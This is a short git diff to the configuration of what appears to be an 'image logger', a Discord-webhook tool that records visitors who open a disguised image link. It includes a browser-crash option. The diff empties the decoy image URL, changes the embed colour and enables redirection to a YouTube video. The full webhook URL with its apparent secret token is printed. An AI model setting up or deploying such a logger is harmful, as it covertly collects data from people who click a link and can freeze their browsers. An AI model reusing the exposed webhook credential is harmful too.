@@ -13,13 +13,13 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1462933471163842703/Iv05gJFbFE39pnKIRAINN61YiYgSFotnM_3t-yBVJm2jjKb4_5K1KFcmKkteaQ6US8PU",
-    "image": "https://i.redd.it/63mqpk8aexdg1.png", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "snatch blue", # Set this to the name you want the webhook to have
-    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x2dfffe, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": false, # Redirect to a webpage?
+        "redirect": true, # Redirect to a webpage?
         "page": "https://www.youtube.com/watch?v=XEFZ30Cvdnc" # Link to the webpage to redirect to 
     },
 
